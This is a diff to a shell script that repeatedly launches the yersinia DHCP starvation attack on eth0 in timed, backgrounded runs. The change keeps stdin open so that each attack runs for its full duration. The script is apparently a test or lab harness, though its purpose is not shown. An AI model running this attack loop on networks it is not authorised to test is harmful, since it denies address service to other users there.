@@ -34,7 +34,8 @@ cleanup() {
 trap cleanup EXIT INT TERM
 
 for _ in $(seq 1 "${COUNT}"); do
-  timeout -k 2s "${ACTIVE_S}s" nice -n "${NICE_LEVEL}" /usr/bin/yersinia dhcp -attack 1 -interface eth0 &
+  # yersinia stops the attack on stdin EOF, and a background job gets /dev/null as stdin.
+  timeout -k 2s "${ACTIVE_S}s" nice -n "${NICE_LEVEL}" /usr/bin/yersinia dhcp -attack 1 -interface eth0 < <(sleep "${ACTIVE_S}") &
   pids+=("$!")
   sleep_ms "${DELAY_MS}"
 done
